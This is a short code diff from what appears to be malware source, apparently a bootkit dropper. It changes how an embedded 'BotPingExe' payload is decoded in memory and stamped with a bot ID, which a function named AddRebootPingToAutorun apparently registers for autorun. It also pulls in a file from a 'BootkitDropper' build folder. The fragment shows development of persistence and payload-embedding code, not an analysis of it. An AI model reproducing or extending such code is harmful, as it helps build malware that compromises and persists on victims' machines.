@@ -222,7 +222,7 @@ void AddRebootPingToAutorun()
 	bool neededDel;
 	if( TMemoryDLL::DecodeDll( BotPingExe::data, size, exeFile, neededDel ) )
 	{
-		char* p = (char*) m_memmem( exeFile, size, "__BOT_UID__", 11 );
+		char* p = (char*) m_memmem( exeFile, size, "__PINGER_UID__", 14 );
 		if( p )
 		{
 			m_lstrcpy( p, BOT_UID );
@@ -1078,9 +1078,15 @@ void WaitAndExitProcess(DWORD exit_code)
 	pExitProcess(exit_code);
 }
 
+namespace PINGER
+{
+	#include "d:\GSVSoft\Projects\Agents\Builds\BootkitDropper\WhiteJoeRebootPing.cpp"
+}
+
+
 int APIENTRY MyMain(int argc, char** argv)
 {
-	//return 0;
+
 	//TestStepNotifications();
 	//MultiMethodReboot();
 	//return 0;
